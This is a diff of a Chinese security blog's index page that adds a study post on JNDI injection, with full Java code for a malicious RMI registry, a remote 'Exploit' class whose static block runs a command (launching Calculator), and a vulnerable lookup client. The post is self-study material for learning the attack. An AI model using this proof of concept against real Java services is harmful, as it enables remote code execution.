@@ -168,6 +168,180 @@
             
     
     
+        <article class="kratos-hentry kratos-entry-border-new clearfix">
+            <div class="kratos-status">
+                
+                    <i class="fa fa-refresh"></i>
+                
+                <div class="kratos-status-inner">
+                    <div class="kratos-status-content">
+                        
+                            <h1 id="JNDI定义"><a href="#JNDI定义" class="headerlink" title="JNDI定义"></a>JNDI定义</h1><p>JNDI(Java Naming and Directory Interface)，是SUN公司提供的一种标准的Java命名系统接口。为 开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。 现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p>
+<p>看这篇文章了解一下RMI工厂模式</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jackiezhw/article/details/1631456">https://blog.csdn.net/Jackiezhw/article/details/1631456</a></p>
+<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image-20200612135446540.png" alt="img"></p>
+<p>JNDI由JNDI API、命名管理、JNDI SPI（service provider interface）服务提供的接⼝。我们的应⽤可以 通过JNDI的API去访问相关服务提供的接⼝。 我们要使⽤JNDI，必须要有服务提供⽅，我们常⽤的就是JDBC驱动提供数据库连接服务，然后我们配置 JNDI连接 JDK也为我们提供了⼀些服务接⼝： </p>
+<p>LDAP （Lightweight Directory Access Protocol） 轻量级⽬录访问协议 </p>
+<p>CORBA （Common Object Request Broker Architecture） 公共对象请求代理结构服务 </p>
+<p>RMI（Java Remote Method Invocation）JAVA远程远程⽅法调⽤注册 </p>
+<p>DNS（Domain Name Service）域名服务 漏洞中涉及到最多的就是 RMI ， LDAP 两种服务接⼝</p>
+<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
+<p>恶意服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDISERVER</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">       Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">       Reference Exploit = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">       ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(Exploit);</span><br><span class="line">       registry.bind(<span class="string">&quot;Exploit&quot;</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回了一个Reference对象，指向<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/Exploit">http://127.0.0.1:8000/Exploit</a></p>
+<p>恶意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">       System.err.println(<span class="string">&quot;Pwned&quot;</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           String[] cmd = &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;;</span><br><span class="line">           java.lang.Runtime.getRuntime().exec(cmd);</span><br><span class="line">       &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译后放入<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/%E6%A0%B9%E7%9B%AE%E5%BD%95">http://127.0.0.1:8000/根目录</a></p>
+<p>客户端受害者</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDICLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,</span><br><span class="line">                <span class="string">&quot;rmi://127.0.0.1:1099/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        ctx.lookup(<span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">        <span class="comment">//ctx.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;);</span></span><br><span class="line">        <span class="comment">//ctx.lookup(&quot;ldap://127.0.0.1:1099/Exploit&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将编译好的Exploit.class放入<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%8C%E8%BF%90%E8%A1%8C%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%B9%8B%E5%90%8E%E8%BF%90%E8%A1%8C%E5%AE%A2%E6%88%B7%E7%AB%AF">http://127.0.0.1:8000/根目录，运行服务端之后运行客户端</a></p>
+<p>结果</p>
+<p><img src="http://img.le1a.com/2021/11/16/78cdb9091f7ed.png" alt="1637053823447.png"></p>
+<p>还有个JNDI+LDAP注入，之后记</p>
+
+                        
+                    </div>
+                </div>
+            </div>
+            
+                <footer class="kratos-post-meta-new">
+                    <span class="pull-left">
+                        <a><i class="fa fa-calendar"></i></a><a>2021-11-16</a>
+                        
+                        
+                            <!-- 当前仅支持valine/waline自带的统计功能 -->
+                            
+                        
+                        
+                            <!-- 当前仅支持waline自带的统计功能 -->
+                            
+                        
+                    </span>
+                    
+                    
+                        <span class="pull-right">
+                            <a class="read-more" href="/2021/11/16/JNDI%E6%B3%A8%E5%85%A5/" title="留言">留言<i class="fa fa-chevron-circle-right"></i></a>
+                        </span>
+                    
+
+                </footer>
+            
+        </article>
+    
+
+    
+    
+        <article class="kratos-hentry clearfix">
+            <div class="kratos-entry-border-new clearfix">
+                
+                <div class="kratos-entry-thumb-new">
+                    <a href="/2021/11/16/fastjson%E5%9F%BA%E7%A1%80/">
+                        
+                            <img class="kratos-entry-thumb-new-img">
+                        
+                    </a>
+                </div>
+                <div class="kratos-post-inner-new">
+                    <header class="kratos-entry-header-new">
+                            <a class="label-link" href="/categories/java/">java</a>
+                        <h2 class="kratos-entry-title-new"><a href="/2021/11/16/fastjson%E5%9F%BA%E7%A1%80/">java fastjson基础</a>
+                    </header>
+                    <div class="kratos-entry-content-new">
+                        <p>
+                            
+                                java fastjson基础fastjson简介Fastjson是阿里巴巴公司开源的速度最快的Json和对象转换工具,一个Java语言编写的JSON处理器。
+它采用一种“假定有序快速匹配”的算法，是号称Java中最快的json库。
+...
+                            
+                        </p>
+                    </div>
+                </div>
+                <footer class="kratos-post-meta-new">
+                    <span class="pull-left">
+                        <a>
+                            <i class="fa fa-calendar"></i>
+                            2021-11-16
+                        </a>
+                        <a>
+                            
+                        </a>
+                        
+                            <!-- 当前仅支持valine/waline自带的统计功能 -->
+                            
+                        
+                        
+                            <!-- 当前仅支持waline自带的统计功能 -->
+                            
+                        
+                    </span>
+                    <span class="pull-right">
+                        <a class="read-more" href="/2021/11/16/fastjson%E5%9F%BA%E7%A1%80/" title="阅读全文">阅读全文<i class="fa fa-chevron-circle-right"></i></a>
+                    </span>
+                </footer>
+            </div>
+        </article>
+    
+
+    
+    
+        <article class="kratos-hentry clearfix">
+            <div class="kratos-entry-border-new clearfix">
+                
+                <div class="kratos-entry-thumb-new">
+                    <a href="/2021/11/14/RMI%E5%9F%BA%E7%A1%80/">
+                        
+                            <img class="kratos-entry-thumb-new-img">
+                        
+                    </a>
+                </div>
+                <div class="kratos-post-inner-new">
+                    <header class="kratos-entry-header-new">
+                            <a class="label-link" href="/categories/java/">java</a>
+                        <h2 class="kratos-entry-title-new"><a href="/2021/11/14/RMI%E5%9F%BA%E7%A1%80/">java RMI基础</a>
+                    </header>
+                    <div class="kratos-entry-content-new">
+                        <p>
+                            
+                                RMI学习继续补之前的笔记
+RMI是什么RMI（Remote Method Invocation），远程方法调用。实际上就是在一个java虚拟机上调用另一个java虚拟机的对象上的方法。
+RMI依赖的通信协议为JRMP(Java Re...
+                            
+                        </p>
+                    </div>
+                </div>
+                <footer class="kratos-post-meta-new">
+                    <span class="pull-left">
+                        <a>
+                            <i class="fa fa-calendar"></i>
+                            2021-11-14
+                        </a>
+                        <a>
+                            
+                        </a>
+                        
+                            <!-- 当前仅支持valine/waline自带的统计功能 -->
+                            
+                        
+                        
+                            <!-- 当前仅支持waline自带的统计功能 -->
+                            
+                        
+                    </span>
+                    <span class="pull-right">
+                        <a class="read-more" href="/2021/11/14/RMI%E5%9F%BA%E7%A1%80/" title="阅读全文">阅读全文<i class="fa fa-chevron-circle-right"></i></a>
+                    </span>
+                </footer>
+            </div>
+        </article>
+    
+
+    
+    
         <article class="kratos-hentry clearfix">
             <div class="kratos-entry-border-new clearfix">
                 
@@ -543,171 +717,6 @@ fancyapi目录结构
         </article>
     
 
-    
-    
-        <article class="kratos-hentry clearfix">
-            <div class="kratos-entry-border-new clearfix">
-                
-                <div class="kratos-entry-thumb-new">
-                    <a href="/2021/10/03/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF%E2%80%94%E2%80%94Light1ng/">
-                        
-                            <img class="kratos-entry-thumb-new-img">
-                        
-                    </a>
-                </div>
-                <div class="kratos-post-inner-new">
-                    <header class="kratos-entry-header-new">
-                            <a class="label-link" href="/categories/CTFwp/">CTFwp</a>
-                        <h2 class="kratos-entry-title-new"><a href="/2021/10/03/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF%E2%80%94%E2%80%94Light1ng/">绿城杯-Light1ng WP</a>
-                    </header>
-                    <div class="kratos-entry-content-new">
-                        <p>
-                            
-                                Light1ng战队一、战队信息
-名称：Light1ng
-排名：16
-
-二、解题情况进不去平台了，没法截图了
-三、解题过程Web1.ezphpezphp在关于里看到个Git，所以考虑存在git泄露
-
-index.php里的php代码
-...
-                            
-                        </p>
-                    </div>
-                </div>
-                <footer class="kratos-post-meta-new">
-                    <span class="pull-left">
-                        <a>
-                            <i class="fa fa-calendar"></i>
-                            2021-10-03
-                        </a>
-                        <a>
-                            
-                        </a>
-                        
-                            <!-- 当前仅支持valine/waline自带的统计功能 -->
-                            
-                        
-                        
-                            <!-- 当前仅支持waline自带的统计功能 -->
-                            
-                        
-                    </span>
-                    <span class="pull-right">
-                        <a class="read-more" href="/2021/10/03/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF%E2%80%94%E2%80%94Light1ng/" title="阅读全文">阅读全文<i class="fa fa-chevron-circle-right"></i></a>
-                    </span>
-                </footer>
-            </div>
-        </article>
-    
-
-    
-    
-        <article class="kratos-hentry clearfix">
-            <div class="kratos-entry-border-new clearfix">
-                
-                <div class="kratos-entry-thumb-new">
-                    <a href="/2021/10/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-TemplatesImpl%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/">
-                        
-                            <img class="kratos-entry-thumb-new-img">
-                        
-                    </a>
-                </div>
-                <div class="kratos-post-inner-new">
-                    <header class="kratos-entry-header-new">
-                            <a class="label-link" href="/categories/java/">java</a>
-                        <h2 class="kratos-entry-title-new"><a href="/2021/10/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-TemplatesImpl%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/">java反序列化-TemplatesImpl在Shiro中的利用</a>
-                    </header>
-                    <div class="kratos-entry-content-new">
-                        <p>
-                            
-                                前言有段时间没学java了，最近被一堆事情和比赛拖着，国庆假期正好继续补一下java
-java反序列化-TemplatesImpl在Shiro中的利用之前已经知道如何将TemplatesImpl 融合到Commons-Collecti...
-                            
-                        </p>
-                    </div>
-                </div>
-                <footer class="kratos-post-meta-new">
-                    <span class="pull-left">
-                        <a>
-                            <i class="fa fa-calendar"></i>
-                            2021-10-03
-                        </a>
-                        <a>
-                            
-                        </a>
-                        
-                            <!-- 当前仅支持valine/waline自带的统计功能 -->
-                            
-                        
-                        
-                            <!-- 当前仅支持waline自带的统计功能 -->
-                            
-                        
-                    </span>
-                    <span class="pull-right">
-                        <a class="read-more" href="/2021/10/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-TemplatesImpl%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/" title="阅读全文">阅读全文<i class="fa fa-chevron-circle-right"></i></a>
-                    </span>
-                </footer>
-            </div>
-        </article>
-    
-
-    
-    
-        <article class="kratos-hentry clearfix">
-            <div class="kratos-entry-border-new clearfix">
-                
-                <div class="kratos-entry-thumb-new">
-                    <a href="/2021/09/28/%E8%93%9D%E5%B8%BD%E6%9D%AF_one_Pointer_php%E5%A4%8D%E7%8E%B0/">
-                        
-                            <img class="kratos-entry-thumb-new-img">
-                        
-                    </a>
-                </div>
-                <div class="kratos-post-inner-new">
-                    <header class="kratos-entry-header-new">
-                            <a class="label-link" href="/categories/CTFwp/">CTFwp</a>
-                        <h2 class="kratos-entry-title-new"><a href="/2021/09/28/%E8%93%9D%E5%B8%BD%E6%9D%AF_one_Pointer_php%E5%A4%8D%E7%8E%B0/">蓝帽杯_one_Pointer_php复现</a>
-                    </header>
-                    <div class="kratos-entry-content-new">
-                        <p>
-                            
-                                下载源码
-12345&lt;?phpclass User&#123;	public $count;&#125;?&gt;
-
-12345678910111213141516&lt;?phpinclude &quot;user.php&q...
-                            
-                        </p>
-                    </div>
-                </div>
-                <footer class="kratos-post-meta-new">
-                    <span class="pull-left">
-                        <a>
-                            <i class="fa fa-calendar"></i>
-                            2021-09-28
-                        </a>
-                        <a>
-                            
-                        </a>
-                        
-                            <!-- 当前仅支持valine/waline自带的统计功能 -->
-                            
-                        
-                        
-                            <!-- 当前仅支持waline自带的统计功能 -->
-                            
-                        
-                    </span>
-                    <span class="pull-right">
-                        <a class="read-more" href="/2021/09/28/%E8%93%9D%E5%B8%BD%E6%9D%AF_one_Pointer_php%E5%A4%8D%E7%8E%B0/" title="阅读全文">阅读全文<i class="fa fa-chevron-circle-right"></i></a>
-                    </span>
-                </footer>
-            </div>
-        </article>
-    
-
 
 
     <div class='text-center pagination'>
@@ -753,7 +762,7 @@ java反序列化-TemplatesImpl在Shiro中的利用之前已经知道如何将Tem
                 
   <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
     <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFwp/">CTFwp</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A1%86%E6%9E%B6/">框架</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFwp/">CTFwp</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A1%86%E6%9E%B6/">框架</a><span class="category-list-count">1</span></li></ul>
   </aside>
 
 
@@ -766,6 +775,21 @@ java反序列化-TemplatesImpl在Shiro中的利用之前已经知道如何将Tem
   <div class="tab-content">
       <ul class="list-group">
         
+        
+          
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/11/16/fastjson%E5%9F%BA%E7%A1%80/"><i class="fa  fa-book"></i> java fastjson基础</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/11/14/RMI%E5%9F%BA%E7%A1%80/"><i class="fa  fa-book"></i> java RMI基础</a>
+            
+          
         
           
           
@@ -786,17 +810,9 @@ java反序列化-TemplatesImpl在Shiro中的利用之前已经知道如何将Tem
           
         
           
-          
-            <a class="list-group-item" href="/2021/11/08/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%ABweb-wp/"><i class="fa  fa-book"></i> 陇原战疫web部分wp</a>
             
           
-        
-          
-          
-            <a class="list-group-item" href="/2021/11/05/2021%E4%B8%9C%E5%8D%8E%E6%9D%AF%E4%B8%80%E9%81%93java%E9%A2%98/"><i class="fa  fa-book"></i> 2021东华杯一道java题</a>
             
-          
-        
           
             
           
